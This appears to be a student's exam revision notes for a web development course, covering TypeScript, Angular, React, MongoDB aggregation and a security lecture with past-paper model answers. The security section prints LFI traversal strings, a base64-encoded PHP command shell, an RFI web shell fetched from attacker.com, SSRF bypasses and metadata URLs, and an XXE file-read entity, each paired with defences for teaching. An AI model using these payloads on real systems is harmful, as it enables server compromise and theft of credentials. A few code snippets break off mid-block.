L30 TypeScript — The Basics

TypeScript Tutorial TS Types TS Interfaces
What is TypeScript?
  • Open-source, released October 2012 by Microsoft
  • A strict superset of JavaScript — all valid JS is valid TS
  • Designed for large-scale systems; adds optional type safety
  • Cannot run directly — must be transpiled to JavaScript (tsc command)
  • File extensions: .ts or .tsx
  • Install: npm install -g typescript → gives tsc command
  • Config stored in tsconfig.json

Variable Declarations — Implicit vs Explicit

Implicit typing: TypeScript infers the type from the assigned value. Explicit: you declare the type yourself.
// IMPLICIT: type inferred as number — cannot reassign to string
let a = 23; 
a = "Hi"; // ERROR: Type 'string' is not assignable to type 'number'

// EXPLICIT any: can be any type
let a: any = 23;
a = "Hi"; // OK — type is 'any'

// Explicit type annotation
let name: string = "COS216";
let count: number = 0;
let active: boolean = true;

Enums

Enums let you define a set of named constants. Numeric enums auto-increment from 0; string enums keep the value.
enum PizzaToppings {
  TOMATO, // value = 0
  BBQ,    // value = 1
  NONE,   // value = 2
  CREAM   // value = 3
}

enum PizzaSizes {
  S = 's',
  M = 'm',
  L = 'l',
  XL = 'xl'
}

Custom Types (Union Types)

Use the type keyword to create a named union type — a variable can only be one of the listed values.
type Style = 'italic' | 'bold' | 'normal';
let font: Style;
font = 'something'; // ERROR — only 'italic', 'bold', or 'normal' allowed
font = 'bold';      // OK

Interfaces

Interfaces appear in almost EVERY past paper. Master the syntax: property names, types, optional (?), union types, readonly.
interface Avenger {
  name: string,
  rank: number,
  description: string
}

const avenger: Avenger = {
  name: 'Tony',
  rank: 1,
  description: 'The greatest Avenger'
}

Optional properties use ?. Union types use |. These are very common in exams:

interface Module {
  code: string | number,       // can be alphanumeric OR numeric
  name: string,
  description: string,
  prerequisites: string[],       // array of module codes
  assessment: 'SUMMATIVE' | 'FORMATIVE', // only these two values
  year: number,
  period: 'Q1' | 'Q2' | 'S1' | 'Q3' | 'Q4' | 'S2',
  submin?: number,               // optional — the '?' makes it optional
  active: boolean
}
// This is the EXACT question from the 2021 EO3 past paper!

Classes

class Point {
  constructor(public x: number, public y: number) {}
  
  add(point: Point): Point {
    return new Point(this.x + point.x, this.y + point.y);
  }
}

var p1 = new Point(0, 10);
var p2 = new Point(10, 20);
var p3 = p1.add(p2); // { x: 10, y: 30 }

Functions with Types

// Without types (dangerous):
function pow(x, y) { return Math.pow(x, y); }
pow('a', 'b'); // No error — but broken!

// With types (TypeScript):
function pow(x: number, y: number): number {
  return Math.pow(x, y);
}
pow('a', 'b'); // COMPILE ERROR — caught before running!

Arrays

const arr: number[] = [];
arr.push("COS");  // ERROR
arr.push(216);   // OK
arr.push(true);  // ERROR

Tuples

Tuples are fixed-length arrays with specified types at each position. Use ? for optional elements.
type MyList = [String?, Boolean?, number?];
const arr: MyList = [];
arr.push("COS");
arr.push(true);
arr.push(216);

Generics

class COS<T> {
  constructor(public value: T) {}
}
let n = new COS(216); // implicitly COS<number>

Loops (for...in vs for...of)

for...in gives INDICES (keys). for...of gives VALUES. This is a common trick question!
let list = [4, 5, 6];
for (let i in list)  { console.log(i); } // "0", "1", "2" — INDICES
for (let i of list)  { console.log(i); } // "4", "5", "6" — VALUES

Export / Import

// file: point.ts
export class Point {
  constructor(public x: number, public y: number) {}
}

// file: main.ts
import { Point } from './point'; // no .ts extension

Component Structure

Every Angular component has 3 parts: Import, Decorator (@Component), and Class. The decorator ties the template and styles to the class.
import { Component } from '@angular/core';

@Component({
  selector: 'app-root',          // HTML tag to use this component
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  title = 'demo';
}

Data Binding — TypeScript to HTML

Use double curly braces {{ }} (called "interpolation" or "handlebars"/"moustache") to show TypeScript variables in HTML.
// home.component.ts
export class HomeComponent {
  counter: number = 0;
  name: string = "";

  count() {
    this.counter++;
  }
}

<!-- home.component.html -->
<button (click)="count()">Click Me</button>
<p>You clicked {{ counter }} times.</p>

Two-Way Data Binding — [(ngModel)]

[(ngModel)] requires FormsModule to be imported in app.module.ts or the component's imports.
<!-- Binds input value to 'name' variable in both directions -->
<input type="text" [(ngModel)]="name">
<p>Hi {{ name }}!</p>

Template Logic — *ngIf

Use ng-template with [ngIf] and [ngIfElse] to conditionally show content. The #none is a template reference variable.
<ng-template [ngIf]="counter > 5" [ngIfElse]="none">
  Clicking too much!
</ng-template>
<ng-template #none>
  Not clicking enough.
</ng-template>

Dynamic CSS with ngStyle and ngClass

<!-- Inline style based on condition -->
<p [ngStyle]="{'color': counter > 10 ? 'red' : 'green'}">Text</p>

<!-- Single class toggle -->
<p [class.active]="counter > 10">Text</p>

<!-- Multiple classes from a method -->
<p [ngClass]="setClasses()">Text</p>

// In TypeScript:
setClasses() {
  return {
    active:    this.counter > 6,
    notactive: this.counter < 6,
    bold:      this.counter > 10

}

L32 React — A Frontend Framework

React Tutorial
What is React?
  • A JavaScript library for building user interfaces, developed by Facebook/Meta
  • Component-based: UI is built from reusable pieces
  • State-driven: UI updates automatically when state changes
  • Declarative: Describe what the UI should look like, not how to update it
  • Uses JSX — syntax that looks like HTML inside JavaScript

Components & Props

Components are functions that return JSX. Props allow passing data from parent to child components. A component's JSX must be wrapped in one parent element.
// Define component with typed props (TypeScript)
type MovieCardProps = {
  title: string;
  year: number;
};

function MovieCard({ title, year }: MovieCardProps) {
  return (
    <div>
      <h2>{title}</h2>
      <p>{year}</p>
    </div>
  );
}

// Use the component with different props
<MovieCard title="Inception" year={2010} />
<MovieCard title="Interstellar" year={2014} />

State — useState Hook

State is data that can change over time. When state changes, React re-renders the component. useState returns [currentValue, setter].
import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState<number>(0);
  //    ^state var  ^setter      ^type    ^initial value

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+</button>
    </div>
  );
}

Events

function Button() {
  function handleClick() {
    console.log('Button clicked!');
  }
  return <button onClick={handleClick}>Click Me</button>;
}

Rendering Lists

When rendering lists, each item needs a unique key prop — otherwise React can't track updates efficiently.
const movies = [
  { id: 1, title: 'Batman' },
  { id: 2, title: 'Superman' }
];

function MovieList() {
  return (
    <ul>
      {movies.map(movie => (
        <MovieCard key={movie.id} title={movie.title} />
      ))}
    </ul>
  );
}

Conditional Rendering

// Method 1: Logical AND (&&) — show if condition is true
{isLoggedIn && <Dashboard />}

// Method 2: Ternary — show A or B
{isLoading ? <Spinner /> : <Results />}

// Method 3: if statement in function
function Greeting({ isLoggedIn }: { isLoggedIn: boolean }) {
  if (isLoggedIn) return <h1>Welcome back!</h1>;
  return <h1>Please log in.</h1>;
}

Declarative vs Imperative

❌ Imperative (Vanilla JS)

Find the element → Change the text → Hide this → Show that (manual DOM manipulation)

✅ Declarative (React)

Describe what the UI should look like for a given state. React handles all DOM updates automatically.

What is Hybrid Mobile?

A blend of native and web solutions. Core is written in web technologies (HTML/CSS/JS) and compiled to a native app. Write once, deploy to multiple platforms.

Advantages:
  • One codebase, multiple platforms
  • Uses web technologies
  • Cost effective, quicker to market
  • Easier to code
Disadvantages:
  • Performance (slower than native)
  • Debugging challenges
  • Limited native features

L38 MongoDB

MongoDB Tutorial
Why MongoDB? Problems with SQL
  • SQL requires schema to be defined upfront — MongoDB has a dynamic schema
  • SQL struggles with hypermedia (video, audio, images)
  • SQL can be slow with very large datasets
  • MongoDB stores data as documents (similar to JSON objects)
  • Released 2009 — free, open-source, cross-platform
  • Written in C/C++ and JavaScript — works great with NodeJS

NoSQL Types

Document databasesMongoDBKey-value pairs grouped as documents (JSON-like)
Wide-column storesCassandra, HBaseOptimized for large dataset queries, stores columns together
Graph databasesNeo4jData as nodes and edges — great for social networks

CRUD Operations

Create / Insert

// Create or switch to database
use mydb

// Insert single document
db.myCollection.insert({ name: "Bitcoin", price: 8521.32 });

// Insert multiple documents
db.myCollection.insert([
  { name: "Bitcoin", price: 8521.32 },
  { name: "Ethereum", price: 625.32 }
]);

Read / Find

// Find all documents
db.myCollection.find({});

// Find by exact match
db.myCollection.find({ name: "Bitcoin" });

// Find with comparison operators
db.myCollection.find({ price: { $lt: 5200 } });    // less than
db.myCollection.find({ price: { $lte: 5200 } });   // less than or equal
db.myCollection.find({ price: { $gt: 5000 } });    // greater than
db.myCollection.find({ price: { $gte: 5000 } });   // greater than or equal
db.myCollection.find({ price: { $ne: 5000 } });    // not equal

// AND (multiple criteria in same object)
db.myCollection.find({ name: "Bitcoin", price: { $lt: 10000 } });

// OR
db.myCollection.find({ $or: [

Aggregation Pipeline — Very Important!

Aggregation is a common exam topic. Learn the pipeline structure: $match → $group → $match → $sort → $out. Each stage passes results to the next.
StagePurpose
$matchFilter documents (like WHERE in SQL)
$groupGroup by a field and apply aggregate functions
$sortSort results (1=ASC, -1=DESC)
$outWrite results to a new collection
FunctionPurpose
$sumCalculate sum
$avgCalculate mean/average
$minFind minimum
$maxFind maximum
// Example: Find max price per coin name
db.myCollection.aggregate([
  {
    $group: { _id: "$name", _price: { $max: "$price" } }
  }
]);
// Result: { "_id": "Bitcoin", "_price": "8765.23" }

// Example: Find all coins above $5000, sort by price descending, save to collection
db.myCollection.aggregate([
  { $group: { _id: "$name", _price: "$price" } },
  { $match: { _price: { $gt: 5000 } } },
  { $sort: { _price: -1 } },
  { $out: "CoinResults" }
]);

// Past paper Q10: Average age per office, oldest to youngest
db.CompanyData.aggregate([
  { $group: { _id: "$Office", AverageAge: { $avg: "$Age" } } },
  { $sort: { AverageAge: -1 } },         // -1 = oldest first = descending
  { $out: "AverageAge" }
]);

L39 Advanced Web Security

Security Topics Covered

LFI (Local File Inclusion), RFI (Remote File Inclusion), SSRF (Server-Side Request Forgery), XXE (XML External Entity), Penetration Testing

1. Local File Inclusion (LFI)

LFI occurs when user-supplied input is used in include() / require() without sanitisation, allowing an attacker to read files from the server's filesystem.

Root causes:

  • User-controlled input passed directly to include()/require()
  • No input validation or sanitisation

Attack vectors:

# Path traversal — go up directories to reach /etc/passwd
?page=../../../../etc/passwd

# Double-dot bypass
?page=....//....//etc/shadow

# PHP wrappers
?page=php://filter/convert.base64encode/resource=index.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Null byte injection (PHP < 5.3)
?page=../../etc/passwd%00

Vulnerable PHP code:

// VULNERABLE — never do this!
$page = $_GET['page'];
include($page);   // attacker controls what file is included!

Defences:

  • Whitelist Pages: Only allow pre-approved filenames. Never use raw user input in include()
  • Input Validation: Strip ../, null bytes, PHP wrapper schemes
  • open_basedir: Restrict PHP to a specific directory via php.ini

2. Remote File Inclusion (RFI)

RFI requires allow_url_include = On in PHP. It allows fetching and executing a remote script — almost always leading to Remote Code Execution (RCE).
AspectLFIRFI
File SourceLocal server filesystemAttacker-controlled remote server
PrerequisiteNone specialallow_url_include = On (PHP)
ImpactFile disclosure, possible RCEDirect Remote Code Execution
PrevalenceMore commonLess common (PHP off by default)

Attack flow:

# 1. Attacker hosts shell.php on their server:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>

# 2. Attacker injects URL into vulnerable parameter:
?file=http://attacker.com/shell.php

# 3. Server fetches and executes the remote file
# 4. Attacker can now run commands: ?cmd=whoami

Defences: Disable allow_url_include in php.ini, never pass user input to include(), whitelist allowed pages, WAF rules.

3. Server-Side Request Forgery (SSRF)

SSRF allows an attacker to cause the server to make HTTP requests to arbitrary destinations — including internal services unreachable from the internet. Listed in OWASP Top 10 (A10:2021).

Impact:

  • Internal Network Scan: Probe http://192.168.x.x to map internal infrastructure
  • Cloud Metadata: AWS metadata at http://169.254.169.254/latest/meta-data/ leaks IAM keys
  • Port Scanning: Identify open internal ports via response time/errors
  • Auth Bypass: Access admin panels protected only by network segmentation

Bypass techniques:

# IP encoding variants (to bypass simple filters)
http://0177.0.0.1/    # octal
http://2130706433/    # decimal
http://[::1]/         # IPv6 loopback

# URL scheme abuse
file:///etc/passwd
dict://localhost:6379/

Defences: Validate and sanitise all URLs before fetch, block RFC-1918 & loopback ranges, allowlist permitted external domains, disable unused URL schemes, use IMDSv2 on AWS.

4. XML External Entity (XXE)

XXE was tested in the 2021 paper (Q13). The question described XML parsing of user-uploaded files, and asked to identify the attack type and prevention.

XXE occurs when XML parser processes user-supplied XML containing a reference to an external entity. OWASP A05:2021.

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
<!-- Server reads /etc/passwd and includes it in the response -->

Attack types: File Disclosure (read /etc/passwd), SSRF (fetch internal URLs), Blind XXE (exfil via DNS out-of-band), DoS (Billion Laughs — nested entity expansion)

Defences: Disable external entity processing in the parser, use JSON instead of XML, validate input with XSD schema, deploy a Web Application Firewall (WAF)

5. Penetration Testing

What is Pen Testing?

A proactive security practice that involves simulating real-world attacks to identify vulnerabilities before malicious actors do. It is an ongoing cycle of research and attack.

Types

TypeWhat the tester knows
Black BoxNothing about internal code structure (simulates real attacker)
White BoxFull knowledge of internal code structure
Gray BoxPartial knowledge of internal code structure

Methodology

PhaseActivities
1. ReconnaissancePassive (OSINT, WHOIS, Shodan) & Active (port scan, DNS enum)
2. Scanning & EnumerationNmap, Nikto, Gobuster — identify services, versions, directories
3. ExploitationExploit vulnerabilities (LFI, RFI, SSRF, SQLi, XSS) using Metasploit / manual
4. Post-ExploitationPrivilege escalation, persistence, lateral movement, data exfil
5. ReportingFindings, CVSS scores, risk ratings, remediation recommendations
Always get written, signed authorisation before testing. Unauthorised testing is ILLEGAL under CFAA (US), Computer Misuse Act (UK), and equivalents globally.

Q1 (3 marks) — Onion Routing vs VPN Security

Explain WHY Onion Routing is more secure than VPN. Mention: multiple hops, encryption layers, metadata privacy, no central point of failure.
Model Answer

Onion routing is more secure because: (1) It routes traffic through multiple intermediate nodes (not just one VPN server), each only knowing the previous and next hop — no single node knows both the source and destination. (2) Each hop adds an additional encryption layer that only it can decrypt. (3) Even if an intermediate node is compromised, it cannot see the full route or message content. (4) A VPN provider can be legally forced to reveal user data; onion nodes have no identifying information. In contrast, a VPN relies on a single trusted third party that knows your identity and destination.

Q2 (3 marks) — Cookies & DOM Storage

Answers
  • a) Header to tell browser to save cookie: Set-Cookie
  • b) Maximum cookie storage size: 4KB
  • c) DOM storage that clears when tab closes: Session Storage

Q3 (2 marks) — Shared Hosting Emails Flagged as Spam

Model Answer

On shared hosting, multiple websites share the same IP address. This means reverse DNS cannot be properly implemented (reverse DNS maps IP → domain, but the IP is shared). If another site on the same IP has been used for spam, the IP's reputation is already poor. Additionally, new IPs haven't built a reputation with email filtering services, causing legitimate emails to be flagged.

Q4 (3 marks) — XXE Attack on XML Portal

Model Answer

Attack type: XML External Entity (XXE) Injection. An attacker could have crafted a malicious XML file with a DOCTYPE declaration that references external entities pointing to sensitive files on the server (e.g., file:///etc/passwd or config files with credentials). When the portal parsed this XML, the parser would fetch and include the file contents in the response, leaking sensitive information. Prevention: Deploy a Web Application Firewall (WAF), disable external entity processing in the XML parser, switch to JSON for data exchange, or validate XML against a strict XSD schema.

Q1 (3 marks) — Short Question: Onion Routing vs Tor

A developer wants to implement anonymous communications in their app. In your own words, briefly explain the core difference between a regular VPN and Tor (Onion Routing) in terms of anonymity and the number of encryption layers.

▶ Show Model Answer

A VPN routes all traffic through a single server (one hop, one encryption layer) and the VPN provider knows your identity and destination. Tor/Onion Routing routes traffic through at least 3 relay nodes, with each adding its own encryption layer. No single relay knows both who sent the data and where it's going — the entry node knows the source but not the destination, while the exit node knows the destination but not the source. This makes Tor significantly harder to trace than a VPN.

Q6 (9 marks) — MongoDB: Complex Aggregation

The GameSales collection has documents: { GameTitle, Genre, Platform, CopiesSold, Revenue }. Write MongoDB aggregation code that:

  • Groups by Genre
  • Calculates the total Revenue and total CopiesSold per genre
  • Only includes genres where total revenue exceeds 1,000,000
  • Sorts by total copies sold, highest first
  • Saves the result to the GenreStats collection
▶ Show Model Answer 
db.GameSales.aggregate([
  {
    $group: {
      _id: "$Genre",
      TotalRevenue: { $sum: "$Revenue" },
      TotalCopiesSold: { $sum: "$CopiesSold" }
    }
  },
  {
    $match: { TotalRevenue: { $gt: 1000000 } }
  },
  {
    $sort: { TotalCopiesSold: -1 }
  },
  {
    $out: "GenreStats"
  }
]);

// TypeScript
results: any[] = [];
totalFound: number = 0;
searchTerm: string = "";

async doSearch() {
  const options: HttpOptions = {
    url: 'https://api.gamehub.com/search',
    headers: { 'Content-Type': 'application/json' },
    data: {
      query: this.searchTerm,
      limit: 10,
      apikey: "abc123"
    }
  };
  const response: HttpResponse = await CapacitorHttp.post(options);
  this.results = response.data.data;
  this.totalFound = response.data.total;
  
  if (this.results.length === 0) {
    await Toast.show({ text: 'No games found' });
  }
}
